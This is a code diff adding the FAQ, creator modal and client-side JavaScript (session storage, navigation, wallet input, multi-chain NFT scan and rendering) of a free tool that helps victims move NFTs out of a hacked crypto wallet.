+        </div>
+      </div>
+    </div>
+    <footer class="footer">
+      <div class="footer-main">
+        <span>Created by <strong>Kane Mayfield</strong></span>
+        <span>—</span>
+        <span>Buy him a</span>
+        <a class="footer-coffee" href="#" onclick="event.preventDefault();openKaneModal()">☕ COFFEE</a>
+        <span>or buy his art and he'll spend that money on stuff even better than coffee.</span>
+      </div>
+      <div class="footer-sub">Free to use · Share it with anyone who needs it</div>
+      <div class="footer-links">
+        <a href="https://kanemayfield.com" target="_blank">KaneMayfield.com</a>
+        <a href="https://twitter.com/kanemayfield" target="_blank">@KaneMayfield</a>
+      </div>
+    </footer>
+  </div>
+
+  <!-- FAQ PAGE -->
+  <div id="page-faq" class="page">
+    <div style="max-width:740px;margin:0 auto;padding:40px 24px 60px;">
+      <div style="text-align:center;margin-bottom:44px;">
+        <img src="https://rufdvqdawrhrqqczy7npzsvyxejlxz3fnsyjodhhftfds2hjjasa.ar.io/jQo6wGC0TxhAWcfa_Mq4uRK752VssJcM5yzKOWjpSCQ/boat.png" alt="Seal" style="width:80px;height:80px;margin:0 auto 16px;display:block;filter:drop-shadow(0 0 20px rgba(255,149,0,0.25));" />
+        <div style="font-family:var(--display);font-size:2.4rem;letter-spacing:0.1em;color:var(--text);">Your Questions, <span style="color:var(--accent);">Answered Honestly</span></div>
+        <div style="font-size:0.82rem;color:var(--text2);line-height:1.9;max-width:520px;margin:16px auto 0;">You just got robbed. You're scared, you're embarrassed, and you don't know who to trust anymore. Every answer here is written to be straight with you... nothing softened, nothing hidden.</div>
+      </div>
+
+      <!-- THE FEAR -->
+      <div style="margin-bottom:36px;">
+        <div style="font-family:var(--display);font-size:1.2rem;color:var(--accent2);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);">The Fear You're Not Saying Out Loud</div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: "Why should I trust this tool with my private key? I just got hacked by trusting something."</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">That's the right question. Honest answer: you shouldn't trust anything blindly... including this. Square yourself with that the best way you can. Run this through whatever gauntlet makes you comfortable. We didn't go to high school together, so measure twice and cut once.<br><br>Here's what you can actually verify: this tool runs entirely on your local machine. There are no hidden endpoints, no analytics, no external servers calling home. The only network requests are to the blockchain RPC and Alchemy API to read your wallet and submit signed transactions.<br><br>Your private key is stored in a JavaScript variable in memory. It is never serialized to a string and sent anywhere except inside a cryptographically signed transaction to the network. When you hit 🔥, that variable is set to null. When you close the tab, it's gone. <strong style="color:var(--text);">There is no "we." This isn't a business. This is self-help with a reassuring voice.</strong><br><br>Review the code. The code is the trust. Read it before you use it.</div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: Is this actually free? What's the catch?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">Free. No catch. <strong style="color:var(--text);">Zero percentage. No fee. No premium tier. No email signup.</strong> I'm Kane... but you get to be anon. This would be like charging you for directions to the bathroom.<br><br>The only cost is Ethereum gas — that fee goes directly to miners and validators on the network. We don't control it and don't benefit from it. At normal gas prices it's usually $5–$40 for a full ETH rescue depending on how many tokens you have and what gwei is at.<br><br>If this tool saved your collection and you want to say thank you, buy Kane a coffee at <a href="https://cash.app/$Kanemayfield" target="_blank" style="color:var(--accent2);">cash.app/$Kanemayfield</a>. Or buy his art at <a href="https://kanemayfield.com" target="_blank" style="color:var(--accent2);">kanemayfield.com</a>. That's the whole business model.</div>
+        </div>
+      </div>
+
+      <!-- UNDERSTANDING WHAT HAPPENED -->
+      <div style="margin-bottom:36px;">
+        <div style="font-family:var(--display);font-size:1.2rem;color:var(--accent2);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);">Understanding What Happened</div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: How did I get hacked? I'm usually careful.</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">Being careful doesn't protect against everything. The most common vectors:<br><br><strong style="color:var(--text);">Malicious signature</strong> — You signed something that looked like a normal NFT listing, bid approval, or mint. It wasn't. It was a "permit" or "setApprovalForAll" that handed over control of your wallet. These are designed to be indistinguishable from real prompts.<br><br><strong style="color:var(--text);">Compromised seed phrase</strong> — Your seed phrase was stored somewhere digital — a screenshot, Notes app, email draft, Google Drive. It got found. Once someone has your seed, every wallet it generates on every chain is permanently theirs.<br><br><strong style="color:var(--text);">Malicious browser extension</strong> — A fake or compromised extension read your clipboard or intercepted your wallet data. Extensions have much more browser access than most people realize.<br><br><strong style="color:var(--text);">Phishing site</strong> — A site that looked like OpenSea, Blur, or another platform you trusted. Same logo, similar URL, different wallet drainer running underneath.<br><br>None of this means you were stupid. These attacks are specifically engineered to fool people who are actively engaged in NFTs — because active collectors click things and sign things. You got hit. Now we get your stuff out.</div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: Why didn't they take my NFTs immediately if they had access?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">Because most drainer bots are built for one thing: instant ETH. Moving NFTs requires knowing which contracts to call, paying gas, handling ERC-721 vs ERC-1155 differences, and waiting for blocks. It's more complicated than just sweeping ETH.<br><br>The bot that hit you is probably sitting on your wallet right now watching for ETH to arrive so it can sweep it. That's its whole job.<br><br><strong style="color:var(--text);">This is your window.</strong> Their laziness is why your NFTs are still there. We exploit that window by moving everything privately before the bot can react.</div>
+        </div>
+      </div>
+
+      <!-- USING THIS TOOL -->
+      <div style="margin-bottom:36px;">
+        <div style="font-family:var(--display);font-size:1.2rem;color:var(--accent2);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);">Using This Tool</div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: What is MEV Blocker and why does it matter?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">MEV Blocker is a private Ethereum RPC endpoint. Instead of broadcasting your transaction to the public mempool — where every bot in the world can see it waiting — it routes your transaction directly to validators in private.<br><br>The mempool is the trap. Normally when you send a transaction, it sits in a public waiting room for a few seconds. The drainer bot is watching that waiting room 24/7. The instant it sees ETH land in your compromised wallet, it submits its own drain transaction with higher gas to cut in line.<br><br>With MEV Blocker, your transactions are invisible until they're already in a block. The bot has zero reaction time because it never knew you were coming. <strong style="color:var(--text);">That's going in through the garage.</strong></div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: How much ETH do I need in my funding wallet?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">The Gas Estimate card calculates this live based on current gas prices and your specific token list. Rough guide:<br><br>• ETH mainnet, 50–150 NFTs: 0.02–0.05 ETH<br>• ETH mainnet, 150–300 NFTs: 0.04–0.09 ETH<br>• Polygon: 5–30 POL (usually under $5)<br>• Base / Optimism: 0.002–0.008 ETH (usually under $15)<br><br>Always run the estimate first. It gives you the exact number with a safety buffer — not a guess.</div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: Can I use the funding feature to send gas to someone else's wallet in an emergency?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">Yes — the private funding feature sends ETH through MEV Blocker regardless of what the destination does with it. If a friend is in a similar situation and needs gas sent privately while they're away from their machine, this can be used for that.<br><br><span style="color:var(--warn);">⚠ Only attempt this after your own rescue is complete, and triple-check the destination address. Blockchain transactions are irreversible. There is no undo.</span></div>
+        </div>
+      </div>
+
+      <!-- SETTING UP ALCHEMY -->
+      <div style="margin-bottom:36px;">
+        <div style="font-family:var(--display);font-size:1.2rem;color:var(--accent2);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);">Setting Up Your Alchemy Key</div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: How do I get an Alchemy API key?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">Go to <a href="https://dashboard.alchemy.com" target="_blank" style="color:var(--accent2);">dashboard.alchemy.com</a> and create a free account. No credit card required. Once logged in, click <strong style="color:var(--text);">Create New App</strong>, give it any name, and copy the API key. Takes about 90 seconds.</div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: The scan only shows Ethereum — where are my Polygon / Base / other chain NFTs?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">By default, Alchemy only enables Ethereum on new apps. You need to enable each chain:<br><br><strong style="color:var(--text);">1.</strong> Go to <a href="https://dashboard.alchemy.com" target="_blank" style="color:var(--accent2);">dashboard.alchemy.com</a><br><strong style="color:var(--text);">2.</strong> Click your app<br><strong style="color:var(--text);">3.</strong> Go to <strong style="color:var(--text);">Networks</strong> (or Configuration)<br><strong style="color:var(--text);">4.</strong> Enable: <strong style="color:var(--text);">Polygon, Base, Optimism, Avalanche</strong><br><strong style="color:var(--text);">5.</strong> Save, then re-scan in LIFEBOAT<br><br>Same API key works for all chains once they're enabled. Takes 30 seconds.</div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: My scan failed or returned no results and my API key looks right.</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">If you just ran a large scan across multiple chains, Alchemy may have temporarily rate-limited your key. This is not a permanent problem — wait 30 seconds and try again. Free tier keys have a limit on how many requests can fire in rapid succession. If the problem persists, go to <a href="https://dashboard.alchemy.com" target="_blank" style="color:var(--accent2);">dashboard.alchemy.com</a>, verify your key is active, and try pasting it again.</div>
+        </div>
+      </div>
+
+      <!-- AFTER THE RESCUE -->
+      <div style="margin-bottom:36px;">
+        <div style="font-family:var(--display);font-size:1.2rem;color:var(--accent2);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);">After the Rescue</div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: Is the compromised wallet safe to use again?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">No. Never use it again. It's community property now — the opposite of a wallet.<br><br>The seed phrase is permanently burned. Anyone who has it owns every wallet it can ever generate, on every chain, forever. The rescue moves your assets out — it doesn't undo the compromise. Write off that wallet and never send anything to it again.</div>
+        </div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: How do I make sure this doesn't happen again?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);"><strong style="color:var(--text);">Seed phrase: Paper only.</strong> Not a photo. Not your Notes app. Not email. Not iCloud. A piece of paper in a safe physical place.<br><br><strong style="color:var(--text);">Hardware wallet:</strong> A Ledger or Trezor keeps your private key on a device that never touches the internet — even when you sign transactions.<br><br><strong style="color:var(--text);">Signing habits:</strong> If a site asks you to sign something and you're not 100% sure what it is — don't. Close the tab. Navigate directly to the official URL.<br><br><strong style="color:var(--text);">Two wallets:</strong> A "hot" wallet for active stuff with small amounts, and a cold storage wallet for anything you'd actually be upset to lose.</div>
+        </div>
+      </div>
+
+      <!-- ONE MORE THING -->
+      <div style="margin-bottom:36px;">
+        <div style="font-family:var(--display);font-size:1.2rem;color:var(--accent2);margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border);">One More Thing</div>
+        <div style="margin-bottom:24px;">
+          <div style="font-size:0.8rem;font-weight:500;color:var(--accent);margin-bottom:10px;">Q: I feel stupid for letting this happen. What do I do with that?</div>
+          <div style="font-size:0.78rem;color:var(--text2);line-height:2;padding-left:18px;border-left:2px solid var(--border2);">You're not stupid. You loved something digital enough to collect it, and someone built a trap specifically for people like you — and me. For people who are active, engaged, and click things because they're actually participating in the space.<br><br>The people who robbed you run automated systems. They do this hundreds of times a day. They're not smarter than you. They throw a thousand stones every couple of hours, and one of them eventually hits something.<br><br>This tool exists because of exactly how you feel right now. The person who built it woke up one morning, found everything gone, and discovered the only real help available basically wanted a percentage of what you had left. So he built what he wished had existed, tested it on himself, and is giving it away.<br><br>Get your things out. Then get back to making and collecting what you love. That's the whole point of any of this.<br><br><strong style="color:var(--text);">I'm Kane Mayfield... and I'm your neighbor.</strong></div>
+        </div>
+      </div>
+
+      <div style="text-align:center;padding-top:20px;border-top:1px solid var(--border);">
+        <button class="btn btn-primary" onclick="showPage('rescue',document.getElementById('nav-rescue'))" style="font-family:var(--display);font-size:1.1rem;letter-spacing:0.15em;padding:16px 48px;">▶ Back to Operations</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- KANE MODAL -->
+<div class="kane-overlay" id="kaneOverlay" onclick="if(event.target===this)closeKaneModal()">
+  <div class="kane-modal">
+    <button class="kane-close" onclick="closeKaneModal()">✕</button>
+
+    <div class="kane-hero">
+      <img class="kane-photo"
+        src="https://hzr35wlyuoapntulkcgrcin5asjbnbzupogo64hjlmrbaw2txeoq.ar.io/PmO-2XijgPbOi1CNESG9BJIWhzR7jO9w6VsiEFtTuR0/kane.png"
+        alt="Kane Mayfield" />
+      <div class="kane-identity">
+        <div class="kane-name">Kane Mayfield</div>
+        <div class="kane-handle">@KaneMayfield · kanemayfield.eth</div>
+        <div class="kane-bio">
+          Artist. Builder. The guy Microsoft's AI painted when asked to picture "a digital creative." He makes music with Bitcoin encoded in the audio, writes product descriptions that are funnier than most comedy albums, and built a 500-page novel into Bitcoin itself.<br><br>
+          He also built this tool — at 2am, the night his wallet was hacked, because nobody was selling lifeboats. So he made one, tested it on himself, and is giving it away.<br><br>
+          <a href="https://x.com/KaneMayfield/status/2019350091941703827" target="_blank">Read the full story: That Little Microsoft Painter Fellow →</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="kane-section">
+      <div class="kane-section-title">If this saved your stuff — say thanks</div>
+      <div class="kane-tip-row">
+        <div class="kane-tip-label">ETH</div>
+        <div class="kane-tip-addr" id="ethAddr">0x56241059e5c3FDA10762fc3ac128112c623A94D6</div>
+        <button class="kane-copy-btn" onclick="copyTip('ethAddr',this)">Copy</button>
+      </div>
+      <div class="kane-tip-row">
+        <div class="kane-tip-label">BTC</div>
+        <div class="kane-tip-addr" id="btcAddr">1pAYXpdLtcsPqypcC3ixQZiCXaobG8HF3</div>
+        <button class="kane-copy-btn" onclick="copyTip('btcAddr',this)">Copy</button>
+      </div>
+      <div class="kane-tip-row">
+        <div class="kane-tip-label">Cash App</div>
+        <div class="kane-tip-addr">$Kanemayfield</div>
+        <a class="kane-copy-btn" href="https://cash.app/$Kanemayfield" target="_blank" style="text-decoration:none;">Open →</a>
+      </div>
+    </div>
+
+    <div class="kane-links">
+      <a class="kane-link-btn primary" href="https://kanemayfield.com" target="_blank">🎨 Buy His Art</a>
+      <a class="kane-link-btn" href="https://www.merchington.com/kanemayfield" target="_blank">🛒 Merchington</a>
+      <a class="kane-link-btn" href="https://twitter.com/kanemayfield" target="_blank">𝕏 @KaneMayfield</a>
+      <a class="kane-link-btn" href="https://x.com/KaneMayfield/status/2019350091941703827" target="_blank">📖 The Writeup</a>
+    </div>
+
+    <div style="padding:14px 28px 20px;font-size:0.58rem;color:var(--text3);line-height:1.7;border-top:1px solid var(--border);font-style:italic;">
+      "Someone, eventually, always notices." — He's still here. He's not going anywhere.
+    </div>
+
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal" id="modal">
+    <div class="modal-icon" id="modalIcon">⚠</div>
+    <div class="modal-title" id="modalTitle"></div>
+    <div class="modal-body" id="modalBody"></div>
+    <div id="modalExtra"></div>
+    <div class="modal-actions" id="modalActions"></div>
+  </div>
+</div>
+
+<input type="file" id="fileInput" accept=".json" style="display:none" onchange="handleFileImport(event)" />
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════════════════════════
+const STATE = {
+  fromWallet: '',
+  toWallet: '',
+  alchemyKey: '',
+  nfts: {},
+  selected: new Set(),
+  flagged: new Set(),
+  openColls: new Set(),
+  closedChains: new Set(),
+  rescueData: null,
+  execChain: null,
+  gasTier: 'recommended',
+  filter: 'all',
+  viewMode: 'list',
+  searchQuery: '',
+};
+
+const KEYS = { compromised: null, funding: null };
+const API = '';
+const EXPLORERS = {
+  eth: 'https://etherscan.io/tx/',
+  polygon: 'https://polygonscan.com/tx/',
+  base: 'https://basescan.org/tx/',
+  optimism: 'https://optimistic.etherscan.io/tx/',
+  avalanche: 'https://snowtrace.io/tx/'
+};
+const CHAIN_INFO = {
+  'eth-mainnet': { key: 'eth', name: 'Ethereum', color: '#627eea', symbol: 'ETH' },
+  'polygon-mainnet': { key: 'polygon', name: 'Polygon', color: '#8247e5', symbol: 'POL' },
+  'base-mainnet': { key: 'base', name: 'Base', color: '#0052ff', symbol: 'ETH' },
+  'opt-mainnet': { key: 'optimism', name: 'Optimism', color: '#ff0420', symbol: 'ETH' },
+  'avax-mainnet': { key: 'avalanche', name: 'Avalanche', color: '#e84142', symbol: 'AVAX' }
+};
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// INIT - Load from localStorage
+// ═══════════════════════════════════════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded', () => {
+  const saved = localStorage.getItem('lifeboat_session');
+  if (saved) {
+    try {
+      const data = JSON.parse(saved);
+      if (data.fromWallet) document.getElementById('fromWallet').value = data.fromWallet;
+      if (data.toWallet) document.getElementById('toWallet').value = data.toWallet;
+      if (data.alchemyKey) document.getElementById('alchemyKey').value = data.alchemyKey;
+      STATE.fromWallet = data.fromWallet || '';
+      STATE.toWallet = data.toWallet || '';
+      STATE.alchemyKey = data.alchemyKey || '';
+      if (data.nfts) STATE.nfts = data.nfts;
+      if (data.selected) STATE.selected = new Set(data.selected);
+      if (data.rescueData) STATE.rescueData = data.rescueData;
+      onWalletInput();
+      if (Object.keys(STATE.nfts).length > 0) {
+        renderAll();
+        document.getElementById('toolbar').style.display = 'flex';
+        document.getElementById('exportRow').style.display = 'flex';
+        document.getElementById('headerStats').style.display = 'flex';
+      }
+    } catch(e) { console.log('No valid session'); }
+  }
+});
+
+function saveSession() {
+  const data = {
+    fromWallet: STATE.fromWallet,
+    toWallet: STATE.toWallet,
+    alchemyKey: STATE.alchemyKey,
+    nfts: STATE.nfts,
+    selected: Array.from(STATE.selected),
+    rescueData: STATE.rescueData
+  };
+  localStorage.setItem('lifeboat_session', JSON.stringify(data));
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// KANE MODAL
+// ═══════════════════════════════════════════════════════════════════════════════
+function openKaneModal() {
+  document.getElementById('kaneOverlay').classList.add('visible');
+}
+function closeKaneModal() {
+  document.getElementById('kaneOverlay').classList.remove('visible');
+}
+function copyTip(id, btn) {
+  const text = document.getElementById(id).textContent.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = 'Copied ✓';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 2000);
+  }).catch(() => {
+    btn.textContent = 'Select & copy manually';
+    setTimeout(() => { btn.textContent = 'Copy'; }, 2500);
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// RESCUE VIDEO
+// ═══════════════════════════════════════════════════════════════════════════════
+function showRescueVideo() {
+  const wrap = document.getElementById('rescueVideoWrap');
+  const vid = document.getElementById('rescueVideo');
+  wrap.classList.add('visible');
+  vid.load();
+  vid.play().catch(() => {});
+}
+
+function hideRescueVideo() {
+  const wrap = document.getElementById('rescueVideoWrap');
+  const vid = document.getElementById('rescueVideo');
+  wrap.classList.remove('visible');
+  vid.pause();
+  vid.currentTime = 0;
+}
+
+function toggleVideoMute() {
+  const vid = document.getElementById('rescueVideo');
+  const btn = document.getElementById('rescueVideoMuteBtn');
+  if (vid.muted) {
+    vid.muted = false;
+    vid.volume = 0.18;
+    btn.textContent = '🔊 SOUND ON';
+  } else {
+    vid.muted = true;
+    btn.textContent = '🔇 SOUND OFF';
+  }
+}
+
+
+function showSplashMessage() {
+  document.getElementById('splashLanding').classList.add('hidden');
+  document.getElementById('splashBg').classList.add('dimmed');
+  document.getElementById('splashVignette').classList.add('dimmed');
+  const wrap = document.getElementById('splashMsgWrap');
+  wrap.classList.add('visible');
+  setTimeout(() => { wrap.scrollTop = 0; }, 50);
+}
+
+function enterTool() {
+  document.getElementById('splash').classList.add('gone');
+  document.getElementById('appRoot').style.opacity = '1';
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════════════════════════════════════════
+function showPage(name, btn) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page-' + name).classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.body.className = 'tab-' + name;
+}
+
+function showLbTab(name, btn) {
+  document.querySelectorAll('.lb-tab-content').forEach(t => t.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  document.querySelectorAll('.lb-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// UTILITIES
+// ═══════════════════════════════════════════════════════════════════════════════
+function shortAddr(a) { return a ? a.slice(0,6)+'...'+a.slice(-4) : '—'; }
+function ts() { return new Date().toLocaleTimeString('en-US',{hour12:false}); }
+function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+
+function log(msg, type='dim', txHash=null, chain=null) {
+  const el = document.getElementById('execLog');
+  if (!el) return;
+  el.style.display = 'block';
+  const line = document.createElement('div');
+  line.className = 'log-line';
+  let link = '';
+  if (txHash && chain && EXPLORERS[chain]) {
+    link = ` <a href="${EXPLORERS[chain]}${txHash}" target="_blank">[view]</a>`;
+  }
+  line.innerHTML = `<span class="log-ts">${ts()}</span><span class="log-${type}">${msg}${link}</span>`;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// MODAL
+// ═══════════════════════════════════════════════════════════════════════════════
+function showModal(icon, title, body, actions, extra='') {
+  document.getElementById('modalIcon').textContent = icon;
+  document.getElementById('modalTitle').textContent = title;
+  document.getElementById('modalBody').innerHTML = body;
+  document.getElementById('modalExtra').innerHTML = extra;
+  const actEl = document.getElementById('modalActions');
+  actEl.innerHTML = '';
+  actions.forEach(a => {
+    const btn = document.createElement('button');
+    btn.className = 'btn ' + a.cls;
+    btn.textContent = a.label;
+    btn.onclick = a.fn;
+    actEl.appendChild(btn);
+  });
+  document.getElementById('modalOverlay').classList.add('visible');
+}
+function closeModal() { document.getElementById('modalOverlay').classList.remove('visible'); }
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// WALLET INPUT
+// ═══════════════════════════════════════════════════════════════════════════════
+function onWalletInput() {
+  STATE.fromWallet = document.getElementById('fromWallet').value.trim();
+  STATE.toWallet = document.getElementById('toWallet').value.trim();
+  STATE.alchemyKey = document.getElementById('alchemyKey').value.trim();
+  // Only FROM wallet required for scanning - TO wallet required at export/execute
+  document.getElementById('scanBtn').disabled = !(STATE.fromWallet.length >= 6);
+  updateHeaderWallets();
+}
+
+function updateHeaderWallets() {
+  const d = document.getElementById('walletDisplay');
+  document.getElementById('hdrFrom').textContent = STATE.fromWallet ? shortAddr(STATE.fromWallet) : '—';
+  document.getElementById('hdrTo').textContent = STATE.toWallet ? shortAddr(STATE.toWallet) : 'NOT SET';
+  document.getElementById('hdrTo').style.color = STATE.toWallet ? 'var(--safe)' : 'var(--danger)';
+  if (STATE.fromWallet || STATE.toWallet) d.classList.add('show'); else d.classList.remove('show');
+}
+
+function updateStats() {
+  const all = [];
+  for (const [chain, colls] of Object.entries(STATE.nfts)) {
+    for (const c of colls) for (const t of c.tokens) all.push(`${chain}:${c.contract}:${t.tokenId}`);
+  }
+  document.getElementById('statTotal').textContent = all.length;
+  document.getElementById('statRescue').textContent = STATE.selected.size;
+  document.getElementById('statSkip').textContent = all.length - STATE.selected.size;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// SCANNING
+// ═══════════════════════════════════════════════════════════════════════════════
+async function startScan() {
+  // Safety: always read fields directly before scan
+  STATE.fromWallet = document.getElementById('fromWallet').value.trim();
+  STATE.toWallet = document.getElementById('toWallet').value.trim();
+  STATE.alchemyKey = document.getElementById('alchemyKey').value.trim();
+  
+  if (!STATE.alchemyKey) {
+    showModal('🔑', 'Alchemy Key Required', 'A free Alchemy API key is required to scan.\n\nGet one at dashboard.alchemy.com (90 seconds, no credit card).', [{label:'OK',cls:'btn-primary',fn:closeModal}]);
+    return;
+  }
+  document.getElementById('scanBtn').disabled = true;
+  document.getElementById('scanBtn').textContent = '⬡ Scanning...';
+  document.getElementById('content').innerHTML = '<div class="loading-state"><div class="loading-spinner"></div><div class="loading-msg">Scanning all chains...</div></div>';
+  
+  try {
+    const res = await fetch(API + '/api/scan', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ wallet: STATE.fromWallet, alchemyKey: STATE.alchemyKey })
+    });
+    const result = await res.json();
+    if (!result.success) throw new Error(result.error || 'Scan failed');
+    
+    STATE.nfts = result.data.chains;
+    STATE.selected.clear();
+    STATE.openColls.clear();
+    
+    // Report any chain errors
+    if (result.errors && result.errors.length > 0) {
+      console.warn('Chain scan errors:', result.errors);
+      const failedChains = result.errors.map(e => `${e.chain}: ${e.error}`).join('\n');
+      log('⚠ Some chains had errors:\n' + failedChains, 'warn');
+    }
+    
+    // Auto-select all
+    for (const [chain, colls] of Object.entries(STATE.nfts)) {
+      for (const c of colls) for (const t of c.tokens) STATE.selected.add(`${chain}:${c.contract}:${t.tokenId}`);
+    }
+    
+    renderAll();
+    document.getElementById('toolbar').style.display = 'flex';
+    document.getElementById('exportRow').style.display = 'flex';
+    document.getElementById('headerStats').style.display = 'flex';
+    
+    // Log scan summary per chain
+    let summaryParts = [];
+    for (const [chainId, colls] of Object.entries(STATE.nfts)) {
+      const count = colls.reduce((s,c) => s + c.tokens.length, 0);
+      const info = CHAIN_INFO[chainId];
+      summaryParts.push(`${info?.name || chainId}: ${count}`);
+    }
+    console.log('Scan results:', summaryParts.join(', '));
+    
+    saveSession();
+  } catch(e) {
+    document.getElementById('content').innerHTML = `<div class="empty-state"><div class="empty-icon">✗</div><div class="empty-title" style="color:var(--danger)">Scan Failed</div><div class="empty-sub">${esc(e.message)}</div></div>`;
+  }
+  
+  document.getElementById('scanBtn').disabled = false;
+  document.getElementById('scanBtn').textContent = '⬡ Scan All Chains';
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// RENDERING
+// ═══════════════════════════════════════════════════════════════════════════════
+function renderAll() {
+  const content = document.getElementById('content');
+  let html = '';
+  
+  for (const [chainId, colls] of Object.entries(STATE.nfts)) {
+    const info = CHAIN_INFO[chainId];
+    if (!info || !colls.length) continue;
+    
+    // Filter
+    let filteredColls = colls.map(c => ({
+      ...c,
+      tokens: c.tokens.filter(t => {
+        const k = `${chainId}:${c.contract}:${t.tokenId}`;
+        if (STATE.filter === 'rescue' && !STATE.selected.has(k)) return false;
+        if (STATE.filter === 'skip' && STATE.selected.has(k)) return false;
+        if (STATE.filter === 'flagged' && !STATE.flagged.has(k)) return false;
+        if (STATE.searchQuery) {
+          const q = STATE.searchQuery.toLowerCase();
+          if (!c.collection.toLowerCase().includes(q) && !(t.name||'').toLowerCase().includes(q)) return false;
+        }
+        return true;
+      })
+    })).filter(c => c.tokens.length > 0);
+    
+    if (!filteredColls.length) continue;
+    
+    const chainCount = filteredColls.reduce((s,c) => s + c.tokens.length, 0);
+    const chainClosed = STATE.closedChains.has(chainId);
+    html += `<div class="chain-section">
+      <div class="chain-header" onclick="toggleChain('${chainId}')" style="cursor:pointer;">
+        <div class="chain-name">${info.name}</div>
+        <div class="chain-pill" style="border-color:${info.color};color:${info.color}">${info.key.toUpperCase()}</div>
+        <div class="chain-tally">${chainCount} NFT${chainCount!==1?'s':''} · ${filteredColls.length} collection${filteredColls.length!==1?'s':''}</div>
+        <div class="caret ${chainClosed?'':'open'}" style="margin-left:auto;">▶</div>
+      </div>`;
+    
+    for (const coll of filteredColls) {
+      if (chainClosed) continue;
+      const collKey = `${chainId}:${coll.contract}`;
+      const isOpen = STATE.openColls.has(collKey);
+      const total = coll.tokens.length;
+      const selCnt = coll.tokens.filter(t => STATE.selected.has(`${chainId}:${coll.contract}:${t.tokenId}`)).length;
+      let cbState = '', cbMark = '';
+      if (selCnt === total && total > 0) { cbState = 'all'; cbMark = '✓'; }
+      else if (selCnt > 0) { cbState = 'partial'; cbMark = '—'; }
